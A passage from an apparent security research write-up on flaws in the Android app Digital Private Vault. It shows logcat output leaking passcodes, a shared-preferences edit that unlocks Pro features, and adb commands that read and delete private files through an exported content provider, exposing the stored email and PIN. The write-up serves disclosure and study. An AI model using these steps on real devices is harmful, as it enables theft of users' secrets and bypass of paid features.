+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>generic_x86:/data/data/com.techuz.privatevault/shared_prefs <span class="c">## logcat | grep passcode</span>
+06-14 11:09:02.227  4067  7800 D OkHttp  : <span class="nv">device_name</span><span class="o">=</span>Google%20Android%20SDK%20built%20for%20x86&amp;app_version<span class="o">=</span>1.6&amp;device_os<span class="o">=</span>Android&amp;email<span class="o">=</span>0xbro.red%40yopmail.com&amp;passcode<span class="o">=</span>1234
+06-14 16:45:54.337 12997 13608 D OkHttp  : <span class="nv">device_name</span><span class="o">=</span>Google%20Android%20SDK%20built%20for%20x86&amp;app_version<span class="o">=</span>1.6&amp;album_name<span class="o">=</span>asdf&amp;device_os<span class="o">=</span>Android&amp;email<span class="o">=</span>0xbro%40yopmail.com&amp;passcode<span class="o">=</span>asdf
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="premium-feature-unlock-insecure-authorization"><span class="me-2">Premium feature unlock (insecure authorization)</span><a href="#premium-feature-unlock-insecure-authorization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<blockquote class="bug">
+  <p>The application checks whether a user is a “Pro” member from a local configuration file, which in some cases can be modified.</p>
+</blockquote>
+
+<p>Some of the application’s various features, such as wireless syncing or unlimited photo vault, were only available to “Pro” users. Currently, upgrading to Pro does not work anymore. However, looking at the source code, we can still find a way to “elevate” our feature pool.</p>
+
+<p>By default, the application allows you to create up to 5 different albums, after which it requires you to upgrade to the pro version:</p>
+
+<p><a href="/assets/img/digital-private-vault/more-albums.png" class="popup img-link shimmer"><img src="/assets/img/digital-private-vault/more-albums.png" alt="more-albums" width="220" class="center" loading="lazy"></a></p>
+
+<p>Searching inside the source code for this message we end up in the <code class="language-plaintext highlighter-rouge">ImagesFragment</code> class. Here we can notice that the application checks <code class="language-plaintext highlighter-rouge">ImagesFragment.this.isProMember</code> to verify if the user is a Pro member.</p>
+
+<div class="language-java highlighter-rouge"><div class="code-header">
+        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre><span class="cm">/* renamed from: com.techuz.privatevault.ui.fragments.ImagesFragment */</span>
+<span class="cm">/* loaded from: classes2.dex */</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ImagesFragment</span> <span class="kd">extends</span> <span class="nc">BaseActivity</span> <span class="kd">implements</span> <span class="nc">DirectoryAdapter</span><span class="o">.</span><span class="na">OnHideLayoutInteraction</span> <span class="o">{</span>
+<span class="o">...</span>
+<span class="nd">@Override</span> <span class="c1">// android.view.View.OnClickListener</span>
+<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="nc">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>
+	<span class="k">if</span> <span class="o">(</span><span class="nc">ImagesFragment</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">mDirList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">&lt;</span> <span class="mi">5</span> <span class="o">||</span> <span class="nc">ImagesFragment</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">isProMember</span><span class="o">)</span> <span class="o">{</span>
+		<span class="c1">// do "Pro" user reserved stuff</span>
+	<span class="o">}</span>
+	<span class="nc">ImagesFragment</span> <span class="n">imagesFragment</span> <span class="o">=</span> <span class="nc">ImagesFragment</span><span class="o">.</span><span class="na">this</span><span class="o">;</span>
+	<span class="n">imagesFragment</span><span class="o">.</span><span class="na">showAlertDialog</span><span class="o">(</span><span class="n">imagesFragment</span><span class="o">,</span> <span class="s">"Want to create more albums?"</span><span class="o">,</span> <span class="s">"Upgrade to pro and create unlimited albums!"</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="o">});</span>
+<span class="o">...</span>
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">ImagesFragment</code> extends <code class="language-plaintext highlighter-rouge">BaseActivity</code>, so we can look inside this class to understand how the value is decreed. We discover that <code class="language-plaintext highlighter-rouge">BaseActivity</code> set <code class="language-plaintext highlighter-rouge">isProMember</code> depending on <code class="language-plaintext highlighter-rouge">appPreferenceManager</code>:</p>
+
+<div class="language-java highlighter-rouge"><div class="code-header">
+        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="cm">/* renamed from: com.techuz.privatevault.ui.activities.BaseActivity */</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">BaseActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
+<span class="o">...</span>
+<span class="kd">public</span> <span class="kt">boolean</span> <span class="n">isProMember</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+<span class="o">...</span>
+<span class="nd">@Override</span> <span class="c1">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">myPrefs</span> <span class="o">=</span> <span class="n">getSharedPreferences</span><span class="o">(</span><span class="nc">Constants</span><span class="o">.</span><span class="na">NOTIFICATION_CHANNEL_ID</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+        <span class="nc">AppPreferenceManager</span> <span class="n">appPreferenceManager</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AppPreferenceManager</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">prefManager</span> <span class="o">=</span> <span class="n">appPreferenceManager</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">isProMember</span> <span class="o">=</span> <span class="n">appPreferenceManager</span><span class="o">.</span><span class="na">isProMember</span><span class="o">();</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">dbHelperClass</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DbHelperClass</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">mEmailRegistrationReceiver</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">EmailRegistrationReceiver</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>   
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">AppPreferenceManager</code> <sup id="fnref:AppPreferenceManager"><a href="#fn:AppPreferenceManager" class="footnote" rel="footnote" role="doc-noteref">7</a></sup> simply returns a <code class="language-plaintext highlighter-rouge">true</code>/<code class="language-plaintext highlighter-rouge">false</code> value according to what is contained within the configuration file (<code class="language-plaintext highlighter-rouge">shared_prefs/com.techuz.privatevault_preferences.xml</code>) interfacing with <code class="language-plaintext highlighter-rouge">mPrefs</code> <sup id="fnref:mPrefs"><a href="#fn:mPrefs" class="footnote" rel="footnote" role="doc-noteref">8</a></sup>:</p>
+<div class="language-java highlighter-rouge"><div class="code-header">
+        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">AppPreferenceManager</span> <span class="o">{</span>
+<span class="o">...</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">IS_PRO_MEMBER</span> <span class="o">=</span> <span class="s">"isProMember"</span><span class="o">;</span>
+<span class="kd">private</span> <span class="kd">final</span> <span class="nc">SharedPreferences</span> <span class="n">mPrefs</span><span class="o">;</span>
+<span class="o">...</span>
+<span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isProMember</span><span class="o">()</span> <span class="o">{</span>
+	<span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">mPrefs</span><span class="o">.</span><span class="na">getBoolean</span><span class="o">(</span><span class="no">IS_PRO_MEMBER</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="o">...</span>
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>So, to summarize: we can arbitrarily change our “membership” by editing/adding the <code class="language-plaintext highlighter-rouge">isProMember</code> field within <code class="language-plaintext highlighter-rouge">shared_prefs/com.techuz.privatevault_preferences.xml</code>, as done below (make sure to remove any cached data):</p>
+
+<blockquote class="note">
+  <p>This change is only possible via a rooted device</p>
+</blockquote>
+
+<div class="language-xml highlighter-rouge"><div class="code-header">
+        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;</span>
+<span class="nt">&lt;map&gt;</span>
+    <span class="nt">&lt;boolean</span> <span class="na">name=</span><span class="s">"IsFirstTimeLaunch"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;boolean</span> <span class="na">name=</span><span class="s">"isEmailSet"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;int</span> <span class="na">name=</span><span class="s">"total_count"</span> <span class="na">value=</span><span class="s">"20"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;boolean</span> <span class="na">name=</span><span class="s">"isEmailRegistered"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;boolean</span> <span class="na">name=</span><span class="s">"isRateGiven"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;boolean</span> <span class="na">name=</span><span class="s">"isProMember"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/map&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="/assets/img/digital-private-vault/pro.png" class="popup img-link left shimmer"><img src="/assets/img/digital-private-vault/pro.png" alt="pro" width="220"  loading="lazy"></a>
+<a href="/assets/img/digital-private-vault/pro1.png" class="popup img-link left shimmer"><img src="/assets/img/digital-private-vault/pro1.png" alt="pro1" width="220"  loading="lazy"></a>
+<a href="/assets/img/digital-private-vault/pro2.png" class="popup img-link normal shimmer"><img src="/assets/img/digital-private-vault/pro2.png" alt="pro2" width="220"  loading="lazy"></a></p>
+
+<h3 id="arbitrary-file-interaction-using-an-exported-content-provider"><span class="me-2">Arbitrary file interaction using an exported content provider</span><a href="#arbitrary-file-interaction-using-an-exported-content-provider" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<blockquote class="bug">
+  <p>The application exports a content provider which manages private files, allowing anyone to read or delete them.</p>
+</blockquote>
+
+<p>As we saw from both MobSF and the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> file, the application exports a content provider (<code class="language-plaintext highlighter-rouge">MyFileContentProvider</code>) which can be used by anyone:</p>
+
+<div class="language-xml highlighter-rouge"><div class="code-header">
+        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;provider</span> <span class="na">android:name=</span><span class="s">"com.techuz.privatevault.widget.ContentProviders.MyFileContentProvider"</span> 
+<span class="na">android:enabled=</span><span class="s">"true"</span> <span class="na">android:exported=</span><span class="s">"true"</span> <span class="na">android:authorities=</span><span class="s">"com.techuz.privatevault"</span><span class="nt">/&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">MyFileContentProvider</code> class exposes the <code class="language-plaintext highlighter-rouge">content://com.techuz.privatevault/</code> interface and extends <code class="language-plaintext highlighter-rouge">ContentProvider</code> <sup id="fnref:ContentProvider"><a href="#fn:ContentProvider" class="footnote" rel="footnote" role="doc-noteref">9</a></sup>.</p>
+
+<div class="language-java highlighter-rouge"><div class="code-header">
+        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyFileContentProvider</span> <span class="kd">extends</span> <span class="nc">ContentProvider</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Uri</span> <span class="no">CONTENT_URI</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://com.techuz.privatevault/"</span><span class="o">);</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">String</span><span class="o">&gt;</span> <span class="no">MIME_TYPES</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="no">PATH</span><span class="o">;</span>
+    <span class="nc">Context</span> <span class="n">mContext</span><span class="o">;</span>
+<span class="o">...</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>The class also overrides many different functions derived from <code class="language-plaintext highlighter-rouge">ContentProvider</code>, providing a custom implementation for some of them and “disabling” others:</p>
+<div class="language-java highlighter-rouge"><div class="code-header">
+        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+</pre></td><td class="rouge-code"><pre><span class="nd">@Override</span> <span class="c1">// android.content.ContentProvider</span>
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">onCreate</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="o">}</span>
+
+<span class="o">...</span>
+
+<span class="nd">@Override</span> <span class="c1">// android.content.ContentProvider</span>
+<span class="kd">public</span> <span class="nc">String</span> <span class="nf">getType</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">String</span> <span class="n">uri2</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+    <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">str</span> <span class="o">:</span> <span class="no">MIME_TYPES</span><span class="o">.</span><span class="na">keySet</span><span class="o">())</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">uri2</span><span class="o">.</span><span class="na">endsWith</span><span class="o">(</span><span class="n">str</span><span class="o">))</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="no">MIME_TYPES</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">str</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span> <span class="c1">// android.content.ContentProvider</span>
+<span class="kd">public</span> <span class="nc">ParcelFileDescriptor</span> <span class="nf">openFile</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">String</span> <span class="n">mode</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">FileNotFoundException</span> <span class="o">{</span>
+    <span class="nc">File</span> <span class="n">file</span><span class="o">;</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getPath</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">uri</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">isEmpty</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">uri</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"/"</span><span class="o">))</span> <span class="o">{</span>
+        <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getPath</span><span class="o">());</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="no">PATH</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="nc">ParcelFileDescriptor</span><span class="o">.</span><span class="na">open</span><span class="o">(</span><span class="n">file</span><span class="o">,</span> <span class="no">C1099C</span><span class="o">.</span><span class="na">ENCODING_PCM_32BIT</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nf">FileNotFoundException</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getPath</span><span class="o">());</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span> <span class="c1">// android.content.ContentProvider</span>
+<span class="kd">public</span> <span class="nc">Cursor</span> <span class="nf">query</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">url</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">projection</span><span class="o">,</span> <span class="nc">String</span> <span class="n">selection</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">,</span> <span class="nc">String</span> <span class="n">sort</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="s">"Operation not supported"</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span> <span class="c1">// android.content.ContentProvider</span>
+<span class="kd">public</span> <span class="nc">Uri</span> <span class="nf">insert</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">ContentValues</span> <span class="n">initialValues</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="s">"Operation not supported"</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span> <span class="c1">// android.content.ContentProvider</span>
+<span class="kd">public</span> <span class="kt">int</span> <span class="nf">update</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">ContentValues</span> <span class="n">values</span><span class="o">,</span> <span class="nc">String</span> <span class="n">where</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">whereArgs</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="s">"Operation not supported"</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="nd">@Override</span> <span class="c1">// android.content.ContentProvider</span>
+<span class="kd">public</span> <span class="kt">int</span> <span class="nf">delete</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">String</span> <span class="n">where</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">whereArgs</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">new</span> <span class="nf">File</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getPath</span><span class="o">()).</span><span class="na">delete</span><span class="o">();</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">mContext</span><span class="o">.</span><span class="na">getContentResolver</span><span class="o">().</span><span class="na">notifyChange</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We can interact with every overridden method, but because both <code class="language-plaintext highlighter-rouge">delete()</code> and <code class="language-plaintext highlighter-rouge">openFile()</code> has a custom and useful logic, those are the one we are more interested in. Using <code class="language-plaintext highlighter-rouge">adb shell content</code> we can communicate with both methods and because the provider is exported and there are no security measures in place, we can use them to read and delete arbitrary files stored within <code class="language-plaintext highlighter-rouge">/data/data/com.techuz.privatevault</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre></td><td class="rouge-code"><pre>PS <span class="o">&gt;</span> .<span class="se">\p</span>latform-tools<span class="se">\a</span>db.exe shell <span class="nb">ls</span> /data/data/com.techuz.privatevault/shared_prefs
+...
+PV.xml
+...
+PS <span class="o">&gt;</span> .<span class="se">\p</span>latform-tools<span class="se">\a</span>db.exe shell content <span class="nb">read</span> <span class="nt">--uri</span> content://com.techuz.privatevault/data/data/com.techuz.privatevault/shared_prefs/PV.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s1">'1.0'</span> <span class="nv">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span> <span class="nv">standalone</span><span class="o">=</span><span class="s1">'yes'</span> ?&gt;
+&lt;map&gt;
+    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"PV_EMAIL"</span><span class="o">&gt;</span>0xbro@yopmail.com&lt;/string&gt;
+    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"PASSCODE"</span><span class="o">&gt;</span>0000&lt;/string&gt;
+&lt;/map&gt;
+PS <span class="o">&gt;</span> .<span class="se">\p</span>latform-tools<span class="se">\a</span>db.exe shell content delete <span class="nt">--uri</span> content://com.techuz.privatevault/data/data/com.techuz.privatevault/shared_prefs/PV.xml
+
+<span class="c">## even if we get an error, the file is still deleted</span>
+Error <span class="k">while </span>accessing provider:com.techuz.privatevault
+java.lang.NullPointerException: Attempt to invoke virtual method <span class="s1">'android.content.ContentResolver android.content.Context.getContentResolver()'</span> on a null object reference
+        at android.os.Parcel.createException<span class="o">(</span>Parcel.java:2077<span class="o">)</span>
+        at android.os.Parcel.readException<span class="o">(</span>Parcel.java:2039<span class="o">)</span>
+        at android.database.DatabaseUtils.readExceptionFromParcel<span class="o">(</span>DatabaseUtils.java:188<span class="o">)</span>
+        at android.database.DatabaseUtils.readExceptionFromParcel<span class="o">(</span>DatabaseUtils.java:140<span class="o">)</span>
+        at android.content.ContentProviderProxy.delete<span class="o">(</span>ContentProviderNative.java:553<span class="o">)</span>
+        at com.android.commands.content.Content<span class="nv">$DeleteCommand</span>.onExecute<span class="o">(</span>Content.java:525<span class="o">)</span>
+        at com.android.commands.content.Content<span class="nv">$Command</span>.execute<span class="o">(</span>Content.java:469<span class="o">)</span>
+        at com.android.commands.content.Content.main<span class="o">(</span>Content.java:690<span class="o">)</span>
+        at com.android.internal.os.RuntimeInit.nativeFinishInit<span class="o">(</span>Native Method<span class="o">)</span>
+        at com.android.internal.os.RuntimeInit.main<span class="o">(</span>RuntimeInit.java:338<span class="o">)</span>
+PS <span class="o">&gt;</span> .<span class="se">\p</span>latform-tools<span class="se">\a</span>db.exe shell content <span class="nb">read</span> <span class="nt">--uri</span> content://com.techuz.privatevault/data/data/com.techuz.privatevault/shared_prefs/PV.xml
+Error <span class="k">while </span>accessing provider:com.techuz.privatevault
+java.io.FileNotFoundException: /data/data/com.techuz.privatevault/shared_prefs/PV.xml
+        at android.database.DatabaseUtils.readExceptionWithFileNotFoundExceptionFromParcel<span class="o">(</span>DatabaseUtils.java:149<span class="o">)</span>
+        at android.content.ContentProviderProxy.openFile<span class="o">(</span>ContentProviderNative.java:604<span class="o">)</span>
+        at com.android.commands.content.Content<span class="nv">$ReadCommand</span>.onExecute<span class="o">(</span>Content.java:587<span class="o">)</span>
+        at com.android.commands.content.Content<span class="nv">$Command</span>.execute<span class="o">(</span>Content.java:469<span class="o">)</span>
+        at com.android.commands.content.Content.main<span class="o">(</span>Content.java:690<span class="o">)</span>
+        at com.android.internal.os.RuntimeInit.nativeFinishInit<span class="o">(</span>Native Method<span class="o">)</span>
+        at com.android.internal.os.RuntimeInit.main<span class="o">(</span>RuntimeInit.java:338<span class="o">)</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>In this way we can retrieve pins, passwords and any other secrets hidden by the application.</p>
+
+<h3 id="other-general-misconfiguration"><span class="me-2">Other general misconfiguration</span><a href="#other-general-misconfiguration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Other than the vulnerabilities we listed above, the application has many other misconfigurations and bugs that do not pose a real threat to the application/user but still allow unintended actions to take place.</p>
+
+<p>The exported <code class="language-plaintext highlighter-rouge">MyBroadcastReceiver</code>, for example, can be used to send customized download notifications to the user:</p>
+
+<div class="language-java highlighter-rouge"><div class="code-header">
+        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyBroadcastReceiver</span> <span class="kd">extends</span> <span class="nc">BroadcastReceiver</span> <span class="o">{</span>
+    <span class="o">...</span>
+    <span class="nd">@Override</span> <span class="c1">// android.content.BroadcastReceiver</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">intExtra</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getIntExtra</span><span class="o">(</span><span class="s">"numCallbacks"</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">stringExtra</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"notificationTitle"</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">stringExtra2</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"notificationMessage"</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">intExtra</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="kt">boolean</span> <span class="n">booleanExtra</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getBooleanExtra</span><span class="o">(</span><span class="s">"serviceRunningForImages"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">serviceWorkingForImages</span> <span class="o">=</span> <span class="n">booleanExtra</span><span class="o">;</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">booleanExtra</span> <span class="o">&amp;&amp;</span> <span class="n">isInImagesActivity</span><span class="o">)</span> <span class="o">{</span>
+                <span class="o">...</span>
